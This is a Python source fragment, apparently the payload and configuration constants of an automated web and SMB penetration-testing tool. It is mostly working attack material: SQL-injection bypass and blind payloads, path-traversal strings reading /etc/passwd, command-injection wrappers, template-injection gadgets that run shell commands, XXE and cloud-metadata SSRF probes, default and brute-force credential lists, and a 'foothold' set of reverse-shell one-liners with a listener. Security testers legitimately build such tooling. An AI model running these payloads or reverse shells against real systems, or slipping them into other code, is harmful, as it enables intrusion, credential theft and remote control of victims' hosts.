# (bytes regex, matched against the response body) confirms a true positive with near-zero
# false positives — a soft-404 200 won't carry `[core]`, `PK\x03\x04`, `ref:`, etc.
_VCS_CHECKS = [
    (".git/HEAD", rb"ref:\s", True),
    (".git/config", rb"\[core\]", True),
    (".git/index", rb"^DIRC", True),
    (".git/logs/HEAD", rb"[0-9a-f]{40}", True),
    (".gitignore", None, False),
    (".svn/entries", None, True),
    (".svn/wc.db", rb"^SQLite format 3", True),
    (".hg/requires", None, True),
    (".bzr/branch-format", None, True),
    (".env", rb"[A-Z0-9_]{2,}=", True),
    (".env.bak", rb"[A-Z0-9_]{2,}=", True),
    (".env.example", rb"[A-Z0-9_]{2,}=", False),
    ("web.config", rb"(?i)<configuration", True),
    ("wp-config.php.bak", rb"(?i)db_password|<\?php", True),
    ("wp-config.php~", rb"(?i)db_password|<\?php", True),
    (".htpasswd", rb":\$", True),
    ("docker-compose.yml", rb"(?i)services:|version:", True),
    ("Dockerfile", rb"(?i)^FROM\s", False),
    ("application.properties", rb"(?i)password|url=", True),
    ("settings.py", rb"(?i)SECRET_KEY|DATABASES", True),
    ("backup.zip", rb"^PK\x03\x04", True),
    ("backup.tar.gz", rb"^\x1f\x8b", True),
    ("backup.sql", rb"(?i)insert into|create table|mysql dump", True),
    ("dump.sql", rb"(?i)insert into|create table", True),
    ("db.sql", rb"(?i)insert into|create table", True),
    ("database.sql", rb"(?i)insert into|create table", True),
    (".DS_Store", rb"Bud1", False),
]
# swap/backup copies of source files leak the source itself (creds, logic) → high
_VCS_SWAP_BASES = ["index.php", "config.php", "wp-config.php", "configuration.php",
                   "database.php", "settings.py", "app.py", ".env"]
_VCS_SWAP_FORMS = ["{b}.bak", "{b}~", "{b}.old", "{b}.save", "{b}.swp", ".{b}.swp", "{b}.orig"]
# archives named after the site, confirmed by their magic bytes where possible
_VCS_ARCH_EXTS = ["zip", "tar.gz", "tgz", "tar", "rar", "7z", "sql", "bak"]
_VCS_ARCH_SIG = {"zip": rb"^PK\x03\x04", "tar.gz": rb"^\x1f\x8b", "tgz": rb"^\x1f\x8b",
                 "tar": None, "rar": rb"^Rar!", "7z": rb"^7z\xbc\xaf",
                 "sql": rb"(?i)insert into|create table", "bak": None}
_VCS_HIGH_RE = re.compile(
    r"\.git|\.svn|\.hg|\.bzr|\.env|\.htpasswd|wp-config|web\.config|"
    r"\.sql$|\.(zip|tar\.gz|tgz|tar|rar|7z)$|"
    r"(\.php|\.py)(~|\.(bak|old|save|orig|swp))$|\.swp$", re.I)
_VCS_DEADLINE = 180
_VCS_THREADS = 20
_VCS_REQ_TIMEOUT = 5


# parameter-name wordlists, best first (multi-path entries merged); builtin fallback below.
_PARAM_WORDLISTS = [
    ("seclists burp-parameter-names", ["/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"]),
    ("arjun params", ["/usr/share/arjun/db/params.txt",
                      "/usr/lib/python3/dist-packages/arjun/db/large.txt"]),
    ("seclists raft-medium-words", ["/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt"]),
]
_PARAM_BUILTIN = [   # ~120 high-value parameter names
    "id", "page", "file", "path", "dir", "folder", "include", "inc", "template", "tpl",
    "doc", "document", "load", "read", "source", "src", "download", "url", "uri", "link",
    "redirect", "next", "return", "returnurl", "dest", "destination", "domain", "callback",
    "site", "feed", "host", "cmd", "exec", "command", "run", "ping", "system", "query",
    "q", "search", "s", "keyword", "user", "username", "uid", "userid", "account", "profile",
    "role", "admin", "debug", "test", "dev", "view", "action", "act", "do", "func", "module",
    "type", "cat", "category", "item", "product", "pid", "name", "email", "token", "key",
    "api_key", "apikey", "auth", "session", "lang", "language", "locale", "format", "output",
    "order", "sort", "field", "column", "table", "db", "data", "value", "val", "content",
    "text", "message", "msg", "code", "status", "state", "mode", "step", "start", "end",
    "limit", "offset", "count", "num", "size", "width", "height", "img", "image", "photo",
    "avatar", "upload", "filename", "filepath", "target", "ref", "referer", "from", "to",
    "date", "time", "year", "month", "day", "flag", "enable", "disable", "show", "hide",
]
_PARAM_DANGEROUS = {
    "file", "path", "dir", "folder", "include", "inc", "page", "template", "tpl", "doc",
    "document", "load", "read", "source", "src", "download", "url", "uri", "link",
    "redirect", "next", "return", "returnurl", "dest", "domain", "callback", "site", "feed",
    "host", "cmd", "exec", "command", "run", "ping", "system", "shell", "query", "id", "uid",
    "userid", "user", "account", "profile", "role", "admin", "debug", "view", "action",
    "do", "func", "module", "filepath", "filename", "target",
}
_PARAM_STATIC_RE = re.compile(
    r"\.(js|css|png|jpe?g|gif|ico|svg|woff2?|ttf|eot|pdf|zip|map|mp4|webp|json)(\?|$)", re.I)
_PARAM_DYNAMIC_RE = re.compile(r"\.(php|asp|aspx|jsp|jspx|cgi|pl|py|do|action)(\?|$)", re.I)
_PARAM_DEADLINE = 600
_PARAM_THREADS = 30
_PARAM_REQ_TIMEOUT = 5
_PARAM_MAX_ENDPOINTS = 12
_PARAM_MAX_WORDS = 5000


# a SMALL curated set of product defaults — this is the default-creds check, NOT a
# brute-force (that is a separate, gated step). Kept short so it never trips a lockout.
_CREDS_DEFAULT = [
    ("admin", "admin"), ("admin", "password"), ("admin", ""), ("admin", "admin123"),
    ("admin", "changeme"), ("admin", "1234"), ("admin", "12345"), ("admin", "default"),
    ("administrator", "password"), ("administrator", "administrator"),
    ("root", "root"), ("root", "toor"), ("root", "password"), ("root", ""),
    ("user", "user"), ("test", "test"), ("guest", "guest"), ("guest", ""),
    ("sa", ""), ("operator", "operator"),
]
# product → (extra creds, extra login paths), matched against detected service/product/cpe
_CREDS_PRODUCT = {
    "tomcat":     ([("tomcat", "tomcat"), ("admin", "tomcat"), ("manager", "manager"),
                    ("tomcat", "s3cret")], ["/manager/html", "/host-manager/html"]),
    "jenkins":    ([("admin", "admin"), ("admin", "password")], ["/login"]),
    "grafana":    ([("admin", "admin")], ["/login"]),
    "phpmyadmin": ([("root", ""), ("root", "root"), ("root", "password")], ["/index.php"]),
    "gitlab":     ([("root", "5iveL!fe"), ("admin", "password")], ["/users/sign_in"]),
    "wordpress":  ([("admin", "admin"), ("admin", "password")], ["/wp-login.php"]),
    "kibana":     ([("elastic", "changeme")], ["/login"]),
    "zabbix":     ([("Admin", "zabbix")], ["/index.php"]),
}
_CREDS_PATH_RE = re.compile(
    r"admin|login|signin|sign-in|manager|portal|panel|console|auth|wp-login|phpmyadmin", re.I)
_CREDS_FALLBACK_PATHS = ["/admin", "/login", "/login.php", "/administrator", "/wp-login.php",
                         "/manager/html", "/phpmyadmin/", "/admin/login", "/user/login"]
_CREDS_ERR_RE = re.compile(
    r"invalid|incorrect|failed|wrong|denied|try again|bad (?:user|pass)|not (?:found|match)", re.I)
_CREDS_OK_RE = re.compile(
    r"logout|log out|sign out|dashboard|welcome|my account|successfully|control panel", re.I)
_CREDS_DEADLINE = 180
_CREDS_THREADS = 8
_CREDS_REQ_TIMEOUT = 5
_CREDS_MAX_TARGETS = 24


# non-destructive SQLi auth-bypass payloads (login logic only — no DROP/DELETE): (user, pass)
_SQLI_BYPASS = [
    ("' OR '1'='1' -- -", ""), ("' OR 1=1 -- -", ""), ("' OR 1=1#", ""),
    ("admin' -- -", ""), ("admin'#", ""), ('" OR "1"="1" -- -', ""),
    ('") OR ("1"="1" -- -', ""), ("' OR 'x'='x", ""), ("' OR ''='", ""),
    ("admin", "' OR '1'='1"), ("admin", "' OR 1=1 -- -"),
]
_SQL_ERROR_RE = re.compile(
    r"you have an error in your sql syntax|warning:\s*mysqli?_|unclosed quotation mark|"
    r"quoted string not properly terminated|ORA-\d{5}|PostgreSQL.*?ERROR|SQLSTATE\[|"
    r"sqlite3?\.(?:OperationalError|Warning)|SQLite/JDBC|System\.Data\.SqlClient|"
    r"ODBC SQL Server Driver|mysql_fetch|supplied argument is not a valid MySQL", re.I)
_AUTHB_DEADLINE = 180
_AUTHB_THREADS = 8
_AUTHB_REQ_TIMEOUT = 5
_AUTHB_MAX_TARGETS = 16


_BRUTE_USER_WORDLISTS = [
    ("seclists top-usernames", ["/usr/share/seclists/Usernames/top-usernames-shortlist.txt"]),
    ("seclists names", ["/usr/share/seclists/Usernames/Names/names.txt"]),
]
_BRUTE_USER_BUILTIN = ["admin", "administrator", "root", "user", "test", "guest", "operator",
                       "manager", "support", "webadmin", "sysadmin", "tomcat", "oracle",
                       "postgres", "info", "demo", "staff", "service", "backup"]
_BRUTE_PASS_WORDLISTS = [
    ("seclists top-500",
     ["/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-500.txt"]),
    ("seclists top-100",
     ["/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt"]),
    ("seclists probable-1575", ["/usr/share/seclists/Passwords/probable-v2-top-1575.txt"]),
    ("rockyou", ["/usr/share/wordlists/rockyou.txt"]),
]
_BRUTE_PASS_BUILTIN = [
    "password", "123456", "123456789", "12345678", "12345", "1234", "admin", "Password1",
    "P@ssw0rd", "password1", "welcome", "welcome1", "changeme", "letmein", "qwerty", "root",
    "toor", "abc123", "admin123", "password123", "iloveyou", "monkey", "dragon", "111111",
    "sunshine", "princess", "football", "secret", "master", "superman", "hello", "login",
    "passw0rd", "test", "guest", "default", "administrator", "qwerty123", "1q2w3e4r",
    "654321", "123321", "000000", "qazwsx", "trustno1", "1234567", "zaq12wsx", "pass",
]
_BRUTE_LOCKOUT_RE = re.compile(
    r"locked|too many|try again later|temporarily (?:disabled|blocked)|rate.?limit|"
    r"account.*(?:disabled|suspended|blocked)|exceeded|throttl", re.I)
_BRUTE_DEADLINE = 600
_BRUTE_THREADS = 4
_BRUTE_REQ_TIMEOUT = 5
_BRUTE_MAX_PASS = 200
_BRUTE_PER_USER_CAP = 100
_BRUTE_USER_ENUM_CAP = 40
_BRUTE_LOCKOUT_PROBE = 5
_BRUTE_MAX_TARGETS = 8


# non-destructive SQLi detection payloads (SELECT/AND/SLEEP only — never DROP/DELETE/UPDATE)
_SQLI_ERR_PAYLOADS = ["'", "\"", "')", "\\"]
_SQLI_DBMS_SIG = [
    ("mysql", r"you have an error in your sql syntax|warning:\s*mysqli?_|MySQL server version|valid MySQL"),
    ("postgresql", r"PostgreSQL.*?ERROR|pg_query|unterminated quoted string"),
    ("mssql", r"SQL Server|System\.Data\.SqlClient|unclosed quotation mark|ODBC SQL Server"),
    ("oracle", r"ORA-\d{5}|quoted string not properly terminated"),
    ("sqlite", r"sqlite3?\.(?:OperationalError|Warning)|SQLite/JDBC|syntax error"),
]
_SQLI_BOOL = [
    ("' AND '1'='1", "' AND '1'='2"),
    ('" AND "1"="1', '" AND "1"="2'),
    (" AND 1=1", " AND 1=2"),
    (" AND 1=1-- -", " AND 1=2-- -"),
]
_SQLI_TIME = [   # (dbms, sleep-5 template, control template)
    ("mysql", "' AND SLEEP({n})-- -", "' AND SLEEP(0)-- -"),
    ("mysql", '" AND SLEEP({n})-- -', '" AND SLEEP(0)-- -'),
    ("mysql", " AND SLEEP({n})", " AND SLEEP(0)"),
    ("postgresql", "' AND {n}=(SELECT {n} FROM PG_SLEEP({n}))-- -", "' AND 0=(SELECT 0)-- -"),
    ("mssql", "'; WAITFOR DELAY '0:0:{n}'-- -", "'; WAITFOR DELAY '0:0:0'-- -"),
]
_SQLI_DEADLINE = 300
_SQLI_THREADS = 6
_SQLI_REQ_TIMEOUT = 10
_SQLI_TIME_DELAY = 5
_SQLI_MAX_PARAMS = 30
_SQLI_MAX_TIME_PARAMS = 12
_SQLI_MAX_SQLMAP = 3
_SQLI_SQLMAP_TIMEOUT = 180


# OSCP-safe SQLi engine (no sqlmap / no external tool): breakout contexts, MySQL-first.
_SQLI_CTX = [("num", "1 "), ("sq", "1' "), ("dq", '1" '), ("sqp", "1') "), ("dqp", '1") ')]
_SQLI_DUMP_ERR = re.compile(
    r"SQL syntax|Unknown column|mysql_|valid MySQL|ORA-\d{5}|PostgreSQL|SQL Server|"
    r"sqlite|Warning|error in your|supplied argument|Query failed", re.I)
_SQLI_INTERESTING_TBL = re.compile(
    r"user|admin|account|member|login|credential|pass|auth|customer|staff|employee|flag|"
    r"secret|config|setting|session|token|key|private|cred", re.I)
_SQLI_INTERESTING_COL = re.compile(
    r"user|name|email|login|pass|pwd|hash|secret|token|key|role|admin|flag", re.I)
_SQLI_DUMP_MAX_TARGETS = 8
_SQLI_DUMP_MAX_COLS = 12
_SQLI_DUMP_ROWS = 15
_SQLI_DUMP_TABLES = 6
_SQLI_DUMP_DEADLINE = 300
_SQLI_DUMP_BLIND_MAXLEN = 64


# LFI / path traversal — file-like param names, read-only payloads, content-verified.
_LFI_FILE_PARAM = re.compile(
    r"file|page|path|include|inc|template|tpl|doc|document|view|lang|dir|load|read|"
    r"download|content|src|url|cat", re.I)
_LFI_PASSWD = ["/etc/passwd"] + ["../" * d + "etc/passwd" for d in range(1, 9)] + [
    "....//" * 6 + "etc/passwd",
    "..%2f" * 6 + "etc%2fpasswd",
    "..%252f" * 6 + "etc%252fpasswd",
    "/etc/passwd%00", "../" * 6 + "etc/passwd%00",
    "php://filter/resource=/etc/passwd",
]
_LFI_WIN = ["..\\" * 6 + "windows\\win.ini", "..%5c" * 6 + "windows%5cwin.ini",
            "C:\\windows\\win.ini"]
_LFI_ENVIRON = ["/proc/self/environ", "../" * 6 + "proc/self/environ"]
_LFI_PHPSRC = ["php://filter/convert.base64-encode/resource=index.php",
               "php://filter/read=convert.base64-encode/resource=index.php",
               "php://filter/convert.base64-encode/resource=index"]
_LFI_SIG_PASSWD = re.compile(r"^[a-zA-Z_][\w.-]*:[^:\n]*:\d+:\d+:", re.M)
_LFI_SIG_WIN = re.compile(r"\[fonts\]|\[extensions\]|for 16-bit app support", re.I)
_LFI_SIG_ENVIRON = re.compile(r"PATH=|HTTP_HOST=|DOCUMENT_ROOT=|SERVER_SOFTWARE=")
_LFI_DEADLINE = 180
_LFI_THREADS = 8
_LFI_MAX_PARAMS = 20


_RFI_DEADLINE = 120
_RFI_THREADS = 8
_RFI_MAX_PARAMS = 20


# OS command injection — params that often reach a shell, tested first.
_CMDI_SUSPECT = re.compile(
    r"host|ip|ping|cmd|exec|dns|domain|url|file|name|query|target|addr|command|run|"
    r"search|lookup|nslookup|trace|port", re.I)
_CMDI_DEADLINE = 240
_CMDI_THREADS = 6
_CMDI_REQ_TIMEOUT = 10
_CMDI_TIME_DELAY = 5
_CMDI_MAX_PARAMS = 20
_CMDI_MAX_TIME_PARAMS = 10


# command-injection separators, shared by cmdi-scan (detection) and foothold (which rebuilds
# the exact wrapper from the label cmdi-scan recorded in the DB). CMD is spliced into the value.
_CMDI_WRAPS = [
    ("; ", lambda c: f"1;{c}"),
    ("| ", lambda c: f"1|{c}"),
    ("&& ", lambda c: f"1&&{c}"),
    ("$(...)", lambda c: f"1$({c})"),
    ("`...`", lambda c: f"1`{c}`"),
    ("newline", lambda c: f"1\n{c}"),
]
_CMDI_TIME_WRAPS = [
    ("; sleep", lambda n: f"1;sleep {n}"),
    ("| sleep", lambda n: f"1|sleep {n}"),
    ("&& sleep", lambda n: f"1&&sleep {n}"),
    ("$(sleep)", lambda n: f"1$(sleep {n})"),
    ("`sleep`", lambda n: f"1`sleep {n}`"),
    ("& ping(win)", lambda n: f"1&ping -n {n + 1} 127.0.0.1"),
]


# SSTI: template syntaxes for the math probe, then per-family RCE gadgets (run a command).
_SSTI_SYNTAX = [
    ("{{ }}", lambda e: "{{" + e + "}}"),
    ("${ }", lambda e: "${" + e + "}"),
    ("#{ }", lambda e: "#{" + e + "}"),
    ("<%= %>", lambda e: "<%= " + e + " %>"),
    ("{ }", lambda e: "{" + e + "}"),
    ("@( )", lambda e: "@(" + e + ")"),
]
# family -> [(engine, gadget(cmd) -> payload)] — gadgets run a shell command via the engine
_SSTI_GADGETS = {
    "{{ }}": [
        ("Jinja2", lambda c: "{{cycler.__init__.__globals__.os.popen('" + c + "').read()}}"),
        ("Jinja2", lambda c: "{{lipsum.__globals__.os.popen('" + c + "').read()}}"),
        ("Twig", lambda c: "{{['" + c + "']|filter('system')}}"),
        ("Nunjucks", lambda c: "{{range.constructor(\"return global.process.mainModule."
                               "require('child_process').execSync('" + c + "')\")()}}"),
    ],
    "${ }": [
        ("Freemarker", lambda c: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("' + c + '")}'),
        ("Mako", lambda c: "${__import__('os').popen('" + c + "').read()}"),
        ("Smarty", lambda c: "${system('" + c + "')}"),
    ],
    "<%= %>": [
        ("ERB", lambda c: "<%= `" + c + "` %>"),
        ("ERB", lambda c: "<%= IO.popen('" + c + "').read %>"),
    ],
    "{ }": [
        ("Smarty", lambda c: "{system('" + c + "')}"),
        ("Smarty", lambda c: "{php}system('" + c + "');{/php}"),
    ],
}
_SSTI_DEADLINE = 150
_SSTI_THREADS = 8
_SSTI_MAX_PARAMS = 20


# ── HTTP step 21: file-upload → webshell (PHP only; exec-verified, non-destructive) ──
_UPLOAD_DEADLINE = 300          # s — hard wall-clock cap over all forms/variants
_UPLOAD_REQ_TIMEOUT = 10
_UPLOAD_MAX_FORMS = 12          # distinct upload surfaces to probe
_UPLOAD_PATH_RE = re.compile(
    r"upload|avatar|profile|import|attach|media|photo|gallery|file", re.I)
# common upload endpoints to try when nothing was mined by earlier steps (per host + vhost)
_UPLOAD_FALLBACK_PATHS = [
    "/upload", "/upload.php", "/uploads", "/admin/upload", "/admin/upload.php",
    "/profile", "/profile.php", "/account", "/avatar", "/avatar.php",
    "/import", "/import.php", "/file", "/files", "/attachment", "/attachments",
    "/media", "/gallery", "/photo", "/settings",
]
# where a stored file is commonly reachable from, checked when the response doesn't leak a URL
_UPLOAD_STORE_DIRS = [
    "/uploads/", "/upload/", "/files/", "/file/", "/images/", "/img/", "/media/",
    "/avatars/", "/avatar/", "/attachments/", "/userfiles/", "/data/", "/assets/",
    "/content/", "/tmp/", "/",
]


# ── HTTP step 22: XXE & SSRF (read-only, in-band + out-of-band) ──
_XXES_DEADLINE = 300
_XXES_REQ_TIMEOUT = 8
_XXES_OOB_WAIT = 6              # s — one window after firing all blind probes of a phase
_XXES_MAX_TARGETS = 24         # per phase (SSRF combos / XML endpoints)
# query-param names that plausibly drive a server-side fetch (SSRF)
_SSRF_PARAMS = {
    "url", "uri", "link", "redirect", "redirect_url", "redirecturl", "next", "dest",
    "destination", "domain", "callback", "feed", "host", "target", "img", "image",
    "imageurl", "load", "src", "source", "proxy", "fetch", "webhook", "u", "page",
    "continue", "return", "returnurl", "out", "view", "site", "reference", "ref", "path",
}
_SSRF_CORE = ["url", "uri", "link", "redirect", "next", "dest", "image", "load",
              "feed", "callback", "target", "proxy"]      # injected on discovered endpoints
# cloud metadata endpoints: (label, url, markers that only appear in a real metadata response)
_SSRF_META = [
    ("aws",   "http://169.254.169.254/latest/meta-data/",
     ("ami-id", "instance-id", "security-credentials", "public-keys", "iam/")),
    ("gcp",   "http://metadata.google.internal/computeMetadata/v1/",
     ("computeMetadata", "project/", "instance/")),
    ("azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     ("azEnvironment", "vmId", "\"compute\"")),
]
# endpoints that classically parse XML / SOAP — POST an XML body here
_XXE_XML_PATHS = ["/xmlrpc.php", "/api", "/api/xml", "/soap", "/services", "/ws",
                  "/rest", "/rpc", "/graphql", "/feed", "/rss"]
# in-band XXE file-read probes: (xml body, detector regex, label)
_XXE_READ = [
    ('<?xml version="1.0" encoding="UTF-8"?>\n'
     '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<r>&xxe;</r>',
     re.compile(r"root:.*?:0:0:"), "file:///etc/passwd"),
    ('<?xml version="1.0" encoding="UTF-8"?>\n'
     '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>\n<r>&xxe;</r>',
     re.compile(r"\[(?:fonts|extensions|mci extensions)\]", re.I), "file:///c:/windows/win.ini"),
]


class _OOBCatcher:
    """Short-lived HTTP catcher for blind XXE / SSRF confirmation: binds an ephemeral port on
    every interface, hands out marker URLs, and records which markers the target actually
    fetched (proving an outbound request it made on our behalf). Read-only and benign — it just
    answers 200. .ok is False if our source IP or the socket could not be set up."""

    def __init__(self, target_ip: str):
        import socket
        import threading
        self.ok = False
        self.myip = None
        self.hits = {}                                       # marker -> (addr, full request path)
        self._lock = threading.Lock()
        try:
            u = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            u.connect((target_ip, 9))
            self.myip = u.getsockname()[0]
            u.close()
        except Exception:                                    # noqa: BLE001
            return
        try:
            self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._srv.bind(("0.0.0.0", 0))
            self._srv.listen(16)
            self._srv.settimeout(1.0)
        except Exception:                                    # noqa: BLE001
            return
        self.port = self._srv.getsockname()[1]
        self._run = True
        self._th = threading.Thread(target=self._loop, daemon=True)
        self._th.start()
        self.ok = True

    def _loop(self):
        import socket
        while self._run:
            try:
                conn, addr = self._srv.accept()
            except socket.timeout:
                continue
            except Exception:                                # noqa: BLE001
                break
            try:
                data = conn.recv(4096).decode("latin-1", "replace")
                m = re.match(r"[A-Z]+ (/\S*)", data)
                if m:
                    full = m.group(1)
                    seg = full.strip("/").split("/")[0].split("?")[0]
                    with self._lock:
                        self.hits[seg] = (addr[0], full)
                conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
            except Exception:                                # noqa: BLE001
                pass
            finally:
                try:
                    conn.close()
                except Exception:                            # noqa: BLE001
                    pass

    def url(self, marker: str) -> str:
        return f"http://{self.myip}:{self.port}/{marker}"

    def seen(self, marker: str):
        with self._lock:
            return self.hits.get(marker)

    def close(self):
        self._run = False
        try:
            self._srv.close()
        except Exception:                                    # noqa: BLE001
            pass


# ── HTTP step 23: IDOR / broken access control (read-only, unauth + optional creds) ──
_IDOR_DEADLINE = 240
_IDOR_REQ_TIMEOUT = 8
_IDOR_MAX_ENDPOINTS = 20        # ID-bearing endpoints to enumerate
_IDOR_MAX_PRIV = 24            # privileged paths to force-browse / bypass
_IDOR_ID_PARAMS = {
    "id", "uid", "user", "userid", "user_id", "account", "acct", "order", "orderid",
    "doc", "docid", "document", "file", "fileid", "invoice", "pid", "record", "rid",
    "num", "no", "key", "ref", "item", "ticket", "pk", "msg", "message",
}
_PRIV_PATH_RE = re.compile(
    r"admin|dashboard|manage|console|users?|account|api|internal|config|report|billing|"
    r"invoice|setting|profile|panel|staff|moderator", re.I)
_PRIV_CONTENT_RE = re.compile(
    r"logout|log ?out|dashboard|administration|manage users|delete\b|\brole\b|privilege|"
    r"add user|user list|<table|control panel|settings", re.I)
_PII_RE = re.compile(
    r"[\w.+-]+@[\w-]+\.[\w.-]+|"                              # email
    r"[\"']?(?:user_?name|email|first_?name|last_?name|phone|address|ssn|balance|role|"
    r"is_?admin|api[_-]?key|token|password)[\"']?\s*[:=]", re.I)
_IDOR_FALLBACK = ["/user/1", "/users/1", "/api/users/1", "/api/user/1", "/account/1",
                  "/accounts/1", "/profile/1", "/order/1", "/orders/1", "/invoice/1",
                  "/api/v1/users/1", "/?id=1"]
_PRIV_FALLBACK = ["/admin", "/admin/users", "/administrator", "/dashboard", "/manage",
                  "/management", "/settings", "/config", "/api/users", "/api/admin",
                  "/users", "/staff", "/panel", "/console"]


# ── HTTP step 24: CMS-specific scan (wpscan / droopescan orchestrator + stdlib fallback) ──
_CMS_DEADLINE = 300
_CMS_REQ_TIMEOUT = 10
_CMS_SCAN_TIMEOUT = 240        # per external scanner
_CMS_MAX_PLUGINS = 25
_WP_TOP_PLUGINS = [
    "akismet", "contact-form-7", "woocommerce", "elementor", "wordpress-seo", "jetpack",
    "wpforms-lite", "wordfence", "all-in-one-seo-pack", "wp-super-cache", "w3-total-cache",
    "really-simple-ssl", "updraftplus", "classic-editor", "mailchimp-for-wp", "redirection",
    "google-site-kit", "ninja-forms", "advanced-custom-fields", "wp-file-manager",
    "ithemes-security", "backwpup", "duplicate-post", "loginizer", "revslider",
]


# ── HTTP step 25: Admin panel → RCE (WordPress; creds-gated, inert, reversible) ──
_ADMINRCE_DEADLINE = 200
_ADMINRCE_REQ_TIMEOUT = 12


# ── HTTP step 26: foothold — spawn & auto-upgrade a reverse shell via a confirmed RCE channel ──
_FOOTHOLD_ENUM_TOOLS = ["python3", "python", "socat", "nc", "ncat", "perl", "php", "ruby", "bash",
                        "script"]
# (label, interpreter it needs, reverse-shell payload with {ip}/{port}, already-interactive-pty?)
_REVSHELLS = [
    ("python3 pty", "python3",
     "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));"
     "[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'", True),
    ("python pty", "python",
     "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));"
     "[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'", True),
    ("socat pty", "socat",
     "socat tcp:{ip}:{port} exec:'bash -li',pty,stderr,setsid,sigint,sane", True),
    ("bash /dev/tcp", "bash", "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'", False),
    ("nc -e", "nc", "nc {ip} {port} -e /bin/bash", False),
    ("nc mkfifo", "nc",
     "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f", False),
    ("perl", "perl",
     "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
     "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");"
     "open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'", False),
    ("php", "php",
     "php -r '$s=fsockopen(\"{ip}\",{port});proc_open(\"/bin/bash -i\","
     "array(0=>$s,1=>$s,2=>$s),$p);'", False),
    ("ruby", "ruby",
     "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;"
     "exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'", False),
]
# self-selecting TTY upgrade sent to a dumb shell on connect: python3 → python → script → bash
_FOOTHOLD_UPGRADE = (
    "(command -v python3>/dev/null&&exec python3 -c 'import pty;pty.spawn(\"/bin/bash\")');"
    "(command -v python>/dev/null&&exec python -c 'import pty;pty.spawn(\"/bin/bash\")');"
    "(command -v script>/dev/null&&exec script -qc /bin/bash /dev/null);exec /bin/bash\n")

_SMART_LISTENER_SRC = r'''
import socket, sys, os, select, time
LPORT = __LPORT__
UPGRADE = __UPGRADE__
srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", LPORT)); srv.listen(1)
sys.stdout.write("[*] pshunter listener on 0.0.0.0:%d - waiting for the target...\n" % LPORT)
sys.stdout.flush()
conn, addr = srv.accept()
sys.stdout.write("[+] shell from %s:%d\n" % addr); sys.stdout.flush()
try:
    cols, rows = os.get_terminal_size()
except Exception:
    cols, rows = 120, 30
if UPGRADE:
    conn.sendall(UPGRADE); time.sleep(0.6)
conn.sendall(("stty rows %d cols %d 2>/dev/null; export TERM=xterm-256color; "
              "export SHELL=/bin/bash\n" % (rows, cols)).encode())
old = None
try:
    import termios, tty
    old = termios.tcgetattr(0); tty.setraw(0)
except Exception:
    pass
try:
    while True:
        r, _, _ = select.select([0, conn], [], [])
        if 0 in r:
            d = os.read(0, 1024)
            if not d:
                break
            conn.sendall(d)
        if conn in r:
            d = conn.recv(4096)
            if not d:
                break
            os.write(1, d)
finally:
    if old is not None:
        try:
            termios.tcsetattr(0, termios.TCSADRAIN, old)
        except Exception:
            pass
    conn.close()
sys.stdout.write("\n[*] session closed - press enter to close this tab\n")
try:
    input()
except Exception:
    pass
'''


# ── HTTP step 27: manual next steps — a context-aware "when stuck" playbook (list only) ──
# ── SMB step 1+2: unauthenticated enumeration ─────────────────────────────────
_SMBENUM_DEADLINE = 240          # s — hard wall-clock cap across every external call
_SMB_ANSI = re.compile(r"\x1b\[[0-9;]*m")


# ── SMB step 2: version-RCE vulnerability scan (DETECTION ONLY) ────────────────
_SMBVULN_DEADLINE = 300          # s — hard wall-clock cap across every external call
# (nmap script, canonical (label, CVE)) — CVE strings kept in the report so the generic
# CVE harvester + KEV tagging pick them up automatically.
_SMBVULN_NMAP = {
    "smb-vuln-ms17-010":            ("MS17-010 EternalBlue", "CVE-2017-0143"),
    "smb-vuln-ms08-067":            ("MS08-067", "CVE-2008-4250"),
    "smb-double-pulsar-backdoor":   ("DoublePulsar implant (host already compromised)", None),
}


# ── SMB step 3: share looting (read-only, in-memory grep) ─────────────────────
_SMBLOOT_DEADLINE = 360          # s — hard wall-clock cap
_SMBLOOT_MAX_FILE = 5_000_000    # per-file download ceiling (bytes)
_SMBLOOT_MAX_FILES = 120         # how many interesting files to fetch+grep
_SMBLOOT_MAX_TOTAL = 100_000_000  # total bytes fetched
# filenames / extensions worth reading — configs, secrets, keys, backups, scripts
_SMB_LOOT_RE = re.compile(
    r"(?i)(groups\.xml|unattend\.xml|sysprep\.(?:inf|xml)|web\.config|autologin|"
    r"\.(?:config|xml|ps1|psd1|bat|cmd|vbs|ini|conf|cnf|env|ya?ml|json|sql|bak|old|kdbx|"
    r"ppk|pem|key|ovpn|rdp|txt|log|csv|ldb|pfx|p12|reg)$|id_[rd]sa|\.git-credentials|"
    r"\.npmrc|passwo?rd|secret|cred|backup|\.kdbx)")


# ── SMB step 4: SYSVOL / NETLOGON GPP loot (authenticated, DC-targeted) ────────
_SMBGPP_DEADLINE = 300           # s — hard wall-clock cap
